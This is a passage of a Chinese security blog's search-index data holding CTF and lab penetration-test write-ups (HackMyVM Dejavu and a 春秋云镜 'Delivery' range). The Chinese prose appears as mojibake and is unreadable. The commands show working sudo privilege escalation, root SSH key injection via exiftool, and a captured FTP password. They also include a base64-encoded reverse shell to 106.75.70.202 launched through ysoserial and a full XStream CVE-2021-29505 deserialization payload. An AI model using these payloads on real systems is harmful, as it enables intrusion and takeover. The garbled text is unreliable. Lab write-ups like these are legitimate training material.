any command\n%sudo   ALL=(ALL:ALL) ALL\nwelcome Dashazi=(kakeru) NOPASSWD: /usr/bin/less\nkakeru ALL=(ALL:ALL) NOPASSWD: /opt/test.sh\n# See sudoers(5) for more information on \"@include\" directives:\n\n@includedir /etc/sudoers.d\n~~~\n\nwelcomeå¯ä»¥åœ¨Dashaziä¸Šä»¥kakeruç”¨æˆ·æ‰§è¡Œ/usr/bin/less\n\n~~~\nwelcome@Kakeru:~$ sudo -u kakeru -h Dashazi /usr/bin/less --help\n!sh\n~~~\n\n~~~\nkakeru@Kakeru:/opt$ sudo -l\nMatching Defaults entries for kakeru on Kakeru:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser kakeru may run the following commands on Kakeru:\n    (ALL : ALL) NOPASSWD: /opt/test.sh\n~~~\n\nå¯ä»¥çœ‹åˆ°å¯ä»¥æ‰§è¡Œ/opt/test.shï¼Œä½†æ˜¯å†…å®¹æ²¡åŠæ³•çœ‹ï¼ŒåŒæ—¶å®¶ç›®å½•ä¹Ÿæœ‰ä¸€ä¸ªtest.sh,è¿™ä¸¤ä¸ªæ–‡ä»¶å¯èƒ½å­˜åœ¨å…³ç³»\n\n~~~\nkakeru@Kakeru:/opt$ sudo /opt/test.sh\nPlease Input: a\n/opt/test.sh: line 5: a: command not found\n~~~\n\nè¿è¡Œå‘ç°åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¾“å…¥ç©ºæ ¼å¯ä»¥å‘ç°\n\n~~~\nkakeru@Kakeru:/opt$ sudo /opt/test.sh\nPlease Input:\n/opt/test.sh: line 5: /home/kakeru/test.sh: Permission denied\n~~~\n\nå“ï¼æŠ¥é”™äº†ï¼ŒæŒ‡å‘å®¶ç›®å½•çš„test.shï¼Œè€Œå®¶ç›®å½•çš„test.shæ˜¯æ²¡æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼Œæ‰€ä»¥å°±èƒ½çŸ¥é“ç¨‹åºä»¥ä½ è¾“å…¥çš„é‚£ä¸ªå­—ç¬¦æ¥è¿è¡Œ/home/kakeru/test.shï¼Œè¾“å…¥ä¸€ä¸ª`.`\n\n~~~\nkakeru@Kakeru:~$ sudo /opt/test.sh\nPlease Input: .\ntest\n~~~\n\nä¼šå‘ç°/home/kakeru/test.shè¢«æ‰§è¡Œäº†ï¼Œå°†å®¶ç›®å½•çš„test.shæ–‡ä»¶æ”¹ä¸ªåå†é‡æ–°å†™ä¸€ä¸ªtest.sh\n\n~~~\nkakeru@Kakeru:~$ mv test.sh 1\nkakeru@Kakeru:~$ echo 'bash -p'>test.sh\nkakeru@Kakeru:~$ chmod +x ./test.sh\nkakeru@Kakeru:~$ sudo /opt/test.sh\nPlease Input:\nroot@Kakeru:/home/kakeru#\n~~~\n\nææƒæˆåŠŸ\n","tags":["é¶æœº"],"categories":["660930334"]},{"title":"HackmyVM-Dejavu","url":"/2025/04/29/HackmyVM-Dejavu/","content":"\n\n\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8f:69:69       PCS Systemtechnik GmbH\n192.168.31.169  08:00:27:b7:b2:91       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.169å°±æ˜¯é¶æœºåœ°å€\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nmap 192.168.31.169\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 22:42 EDT\nNmap scan report for 192.168.31.169\nHost is up (0.00087s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:B7:B2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.88 seconds\n~~~\n\n# 80ç«¯å£\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.169/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.169/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/info.php             (Status: 200) [Size: 69969]\n~~~\n\nåªèƒ½æ‰«åˆ°ä¸€ä¸ªinfo.phpï¼Œæ˜¯ä¸€ä¸ªphpinfoé¡µé¢ï¼Œå‰ç«¯æ³¨é‡Šé‡Œæœ‰ä¸€ä¸ª\n\n~~~\n<!-- /S3cR3t -->\n~~~\n\nè®¿é—®/S3cR3tæœ‰ä¸€ä¸ªupload.php,phpåç¼€ç¦æ­¢ä¸Šä¼ ï¼Œæ”¹åç¼€ä¸ºphtml,æœ‰disable_functionï¼Œå¯ä»¥ç”¨èšå‰‘çš„æ’ä»¶`ç»•è¿‡disable_functions`ç»•è¿‡\n\nåå¼¹ä¸€ä¸ªshellå‡ºæ¥\n\n# ææƒ\n\n~~~\nwww-data@dejavu:/opt$ sudo -l\nMatching Defaults entries for www-data on dejavu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on dejavu:\n    (robert) NOPASSWD: /usr/sbin/tcpdump\n~~~\n\nå¯ä»¥æ— å¯†ç ä»¥robertæ‰§è¡Œtcpdump\n\n~~~\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n~~~\n\nä½†æ˜¯ææƒçš„æ—¶å€™æç¤ºæƒé™ä¸å¤Ÿï¼Œåªèƒ½å¦å¯»ä»–è·¯\n\nä¸Šä¼ ä¸€ä¸ªpspy64ï¼Œç›‘æ§è¿›ç¨‹\n\n~~~\n2025/04/29 03:05:01 CMD: UID=1000  PID=1715   | /usr/sbin/CRON -f\n2025/04/29 03:05:01 CMD: UID=1000  PID=1716   | /bin/sh -c /home/robert/auth.sh\n2025/04/29 03:05:01 CMD: UID=1000  PID=1717   | /bin/sh /home/robert/auth.sh\n2025/04/29 03:05:01 CMD: UID=65534 PID=1719   | /usr/sbin/vsftpd /etc/vsftpd.conf\n2025/04/29 03:05:01 CMD: UID=0     PID=1718   | /usr/sbin/vsftpd /etc/vsftpd.conf\n2025/04/29 03:05:01 CMD: UID=1000  PID=1720   | /usr/sbin/vsftpd /etc/vsftpd.conf\n~~~\n\nå‘ç°robertä¼šè¿è¡Œauth.shï¼Œè¿˜å’Œftpæœ‰å…³ç³»ï¼Œç”¨tcpdumpæŠ“ä¸€ä¸‹åŒ…çœ‹çœ‹\n\n~~~\nwww-data@dejavu:/tmp$ sudo -u robert /usr/sbin/tcpdump tcp port 21 -i lo\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes\n03:09:01.651819 IP localhost.51594 > localhost.ftp: Flags [S], seq 1560518222, win 65495, options [mss 65495,sackOK,TS val 2363185351 ecr 0,nop,wscale 7], length 0\n03:09:01.651828 IP localhost.ftp > localhost.51594: Flags [S.], seq 206236889, ack 1560518223, win 65483, options [mss 65495,sackOK,TS val 2363185351 ecr 2363185351,nop,wscale 7], length 0\n03:09:01.651835 IP localhost.51594 > localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2363185351 ecr 2363185351], length 0\n03:09:01.652915 IP localhost.ftp > localhost.51594: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2363185352 ecr 2363185351], length 20: FTP: 220 (vsFTPd 3.0.3)\n03:09:01.653039 IP localhost.51594 > localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 0\n03:09:01.653087 IP localhost.51594 > localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 13: FTP: USER robert\n03:09:01.653089 IP localhost.ftp > localhost.51594: Flags [.], ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 0\n03:09:01.653260 IP localhost.ftp > localhost.51594: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 34: FTP: 331 Please specify the password.\n03:09:01.653312 IP localhost.51594 > localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 0\n03:09:01.653355 IP localhost.51594 > localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 18: FTP: PASS 9737bo0hFx4\n03:09:01.653357 IP localhost.ftp > localhost.51594: Flags [.], ack 32, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 0\n03:09:01.664382 IP localhost.ftp > localhost.51594: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2363185364 ecr 2363185353], length 23: FTP: 230 Login successful.\n~~~\n\nå¯ä»¥å‘ç°robertçš„å¯†ç æ˜¯`9737bo0hFx4`,suåˆ‡æ¢ç”¨æˆ·\n\n~~~\nrobert@dejavu:/tmp$ sudo -l\nMatching Defaults entries for robert on dejavu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser robert may run the following commands on dejavu:\n    (root) NOPASSWD: /usr/local/bin/exiftool\n~~~\n\nexiftoolå¯ä»¥å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œå†™ä¸ªå…¬é’¥å³å¯\n\n~~~\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n~~~\n\n~~~\nrobert@dejavu:/tmp$ sudo exiftool -filename=$LFILE $INPUT\nError: '/root/.ssh/authorized_keys' already exists - ./authorized_keys\n~~~\n\nå·²ç»å­˜åœ¨äº†ï¼Œé‚£å°±æŠŠè¿™ä¸ªå…¬é’¥ç§»åŠ¨è¿‡æ¥ï¼Œåœ¨å†™å…¬é’¥è¿›å»\n\n~~~\nrobert@dejavu:/tmp$ sudo exiftool -filename=./1 /root/.ssh/authorized_keys\nrobert@dejavu:/tmp$ sudo exiftool -filename=/root/.ssh/authorized_keys ./authorized_keys \n~~~\n\nç„¶åsshç™»å½•å³å¯\n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"æ˜¥ç§‹äº‘é•œ-Delivery","url":"/2025/04/27/æ˜¥ç§‹äº‘é•œ-Delivery/","content":"\n\n\n# FLAG01\n\nå…ˆç”¨ fscan è¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.99.157.149\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    â”‚\nâ”‚  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-27 03:44:50] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-27 03:44:50] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-27 03:44:50] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-27 03:44:51] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-27 03:44:51] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:22\n[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:80\n[2025-04-27 03:44:51] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:21\n[2025-04-27 03:44:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:22 => [ssh] ç‰ˆæœ¬: 8.2p1 Ubuntu 4ubuntu0.5 äº§å“: OpenSSH ç³»ç»Ÿ: Linux ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-27 03:44:51] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:21 => [ftp] ç‰ˆæœ¬: 3.0.3 äº§å“: vsftpd ç³»ç»Ÿ: Unix Banner: [220 (vsFTPd 3.0.3).]\n[2025-04-27 03:44:53] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.157.149:8080\n[2025-04-27 03:44:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:80 => [http]\n[2025-04-27 03:44:59] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.157.149:8080 => [http]\n[2025-04-27 03:45:00] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\n[2025-04-27 03:45:00] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-27 03:45:00] [INFO] åŠ è½½çš„æ’ä»¶: ftp, ssh, webpoc, webtitle\n[2025-04-27 03:45:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.157.149      çŠ¶æ€ç : 200 é•¿åº¦: 10918  æ ‡é¢˜: Apache2 Ubuntu Default Page: It works\n[2025-04-27 03:45:02] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\n[2025-04-27 03:45:02] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.157.149:8080 çŠ¶æ€ç : 200 é•¿åº¦: 3655   æ ‡é¢˜: å…¬å¸å‘è´§å•\n[2025-04-27 03:45:08] [SUCCESS] æ‰«æå·²å®Œæˆ: 6/6\n~~~\n\nftp å¯ä»¥åŒ¿åç™»é™†ï¼Œç™»å½•ä¹‹åå¯ä»¥ä¸‹è½½ä¸€ä¸ª pom.xml\n\n~~~\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n< project xmlns = \"http://maven.apache.org/POM/4.0.0\" xmlns: xsi = \"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi: schemaLocation = \"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\" >\n    <modelVersion> 4.0.0 </modelVersion>\n    <parent>\n        <groupId> org.springframework.boot </groupId>\n        <artifactId> spring-boot-starter-parent </artifactId>\n        <version> 2.7.2 </version>\n        <relativePath/> <!-- lookup parent from repository -->\n    </parent>\n    <groupId> com.example </groupId>\n    <artifactId> ezjava </artifactId>\n    <version> 0.0.1-SNAPSHOT </version>\n    <name> ezjava </name>\n    <description> ezjava </description>\n    <properties>\n        <java.version> 1.8 </java.version>\n    </properties>\n    <dependencies>\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-thymeleaf </artifactId>\n        </dependency>\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-web </artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-test </artifactId>\n            <scope> test </scope>\n        </dependency>\n\n        <dependency>\n            <groupId> com.thoughtworks.xstream </groupId>\n            <artifactId> xstream </artifactId>\n            <version> 1.4.16 </version>\n        </dependency>\n\n        <dependency>\n            <groupId> commons-collections </groupId>\n            <artifactId> commons-collections </artifactId>\n            <version> 3.2.1 </version>\n        </dependency>\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId> org.springframework.boot </groupId>\n                <artifactId> spring-boot-maven-plugin </artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n~~~\n\nå­˜åœ¨æœ‰å±é™©çš„ä¾èµ–\n\n~~~\n <dependency>\n            <groupId> com.thoughtworks.xstream </groupId>\n            <artifactId> xstream </artifactId>\n            <version> 1.4.16 </version>\n        </dependency>\n\n        <dependency>\n            <groupId> commons-collections </groupId>\n            <artifactId> commons-collections </artifactId>\n            <version> 3.2.1 </version>\n        </dependency>\n~~~\n\nå­˜åœ¨ [CVE-2021-29505](https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md) ç”¨ ysoserial è¿›è¡Œåå¼¹ shell\n\n~~~\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \" bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNzUuNzAuMjAyLzQ0NDQgMD4mMQ ==}|{base64,-d}|{bash,-i}\"\n~~~\n\nåœ¨ 8080 ç«¯å£æŠ“åŒ…æ›¿æ¢æˆ payload\n\n~~~\n<java.util.PriorityQueue serialization='custom'>\n    <unserializable-parents/>\n    <java.util.PriorityQueue>\n        <default>\n            <size> 2 </size>\n        </default>\n        <int> 3 </int>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type> 12345 </type>\n            <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n                <m__obj class='string'> com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content </m__obj>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type> 12345 </type>\n            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n                    <parsedMessage> true </parsedMessage>\n                    <soapVersion> SOAP_11 </soapVersion>\n                    <bodyParts/>\n                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n                        <attachmentsInitialized> false </attachmentsInitialized>\n                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n                                    <names>\n                                        <string> aa </string>\n                                        <string> aa </string>\n                                    </names>\n                                    <ctx>\n                                        <environment/>\n                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\n                                            <java.rmi.server.RemoteObject>\n                                                <string> UnicastRef </string>\n                                                <string> 106.75.70.202 </string>\n                                                <int> 1099 </int>\n                                                <long> 0 </long>\n                                                <int> 0 </int>\n                                                <long> 0 </long>\n                                                <short> 0 </short>\n                                                <boolean> false </boolean>\n                                            </java.rmi.server.RemoteObject>\n                                        </registry>\n                                        <host> 106.75.70.202 </host>\n                                        <port> 1099 </port>\n                                    </ctx>\n                                </candidates>\n                            </aliases>\n                        </nullIter>\n                    </sm>\n                </message>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n    </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n~~~\n\nå‘åŒ…ä¹‹å shell å°±å¼¹å‡ºæ¥äº†ï¼Œç„¶åå†™ä¸ªå…¬é’¥è¿›å»ï¼Œflag1 åœ¨/root/flag ä¸‹\n\n# FLAG02\n\nä¸Šä¼ ä¸€ä¸ª fscan æ‰«æå†…ç½‘ï¼Œå†æ­å»ºä¸€ä¸ªä»£ç†\n\n~~~\nroot@ubuntu:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 09:09:4b brd ff: ff: ff: ff: ff: ff\n    inet 172.22.13.14/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359007sec preferred_lft 315359007sec\n    inet6 fe80:: 216:3eff: fe09:94b/64 scope link\n       valid_lft forever preferred_lft forever\nroot@ubuntu:~# ./f\nflag/   fscan2\nroot@ubuntu:~# ./fscan2 -h 172.22.13.14/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    â”‚\nâ”‚  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-27 15:59:52] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-27 15:59:52] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-27 15:59:52] [INFO] CIDR èŒƒå›´: 172.22.13.0-172.22.13.255\n[2025-04-27 15:59:52] [INFO] ç”Ÿæˆ IP èŒƒå›´: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)\n[2025-04-27 15:59:52] [INFO] è§£æ CIDR 172.22.13.14/24 -> IP èŒƒå›´ 172.22.13.0-172.22.13.255\n[2025-04-27 15:59:52] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-27 15:59:52] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.14    å­˜æ´» (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.6     å­˜æ´» (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.57    å­˜æ´» (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] ç›®æ ‡ 172.22.13.28    å­˜æ´» (ICMP)\n[2025-04-27 15:59:55] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-04-27 15:59:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:22\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:22\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:21\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:80\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.57:80\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:135\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:80\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:135\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:445\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:88\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:389\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:139\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.6:139\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:445\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:3306\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.28:8000\n[2025-04-27 15:59:55] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.13.14:8080\n[2025-04-27 15:59:55] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.57:22 => [ssh] ç‰ˆæœ¬: 7.4 äº§å“: OpenSSH ä¿¡æ¯: protocol 2.0 Banner: [SSH-2.0-OpenSSH_7.4.]\n[2025-04-27 15:59:56] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:22 => [ssh] ç‰ˆæœ¬: 8.2p1 Ubuntu 4ubuntu0.5 äº§å“: OpenSSH ç³»ç»Ÿ: Linux  ä¿¡æ¯: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-27 15:59:56] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:21 => [ftp] ç‰ˆæœ¬: 3.0.3 äº§å“: vsftpd ç³»ç»Ÿ: Unix Banner: [220 (vsFTPd 3.0.3).]\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.57:80 => [http] ç‰ˆæœ¬: 1.20.1 äº§å“: nginx\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:445 =>\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:88 =>\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:80 => [http]\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:139 =>  Banner: [.]\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:389 =>\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:139 =>  Banner: [.]\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:445 =>\n[2025-04-27 16:00:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:8000 =>\n[2025-04-27 16:00:02] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:8080 => [http]\n[2025-04-27 16:00:02] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.14:80 => [http]\n[2025-04-27 16:00:09] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:3306 =>  Banner: [!.#08S01Got packets out of order]\n[2025-04-27 16:01:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.28:135 =>\n[2025-04-27 16:01:01] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.13.6:135 =>\n[2025-04-27 16:01:01] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17\n[2025-04-27 16:01:01] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-27 16:01:01] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.57       çŠ¶æ€ç : 200 é•¿åº¦: 4833   æ ‡é¢˜: Welcome to CentOS\n[2025-04-27 16:01:01] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.13.6\nä¸»æœºå: WIN-DC\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4 åœ°å€:\n      â””â”€ 172.22.13.6\n[2025-04-27 16:01:01] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.13.28       çŠ¶æ€ç : 200 é•¿åº¦: 2525   æ ‡é¢˜: æ¬¢è¿ç™»å½• OA åŠå…¬å¹³å°\n[2025-04-27 16:01:01] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\n[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.6     DC: XIAORANG\\WIN-DC\n[2025-04-27 16:01:01] 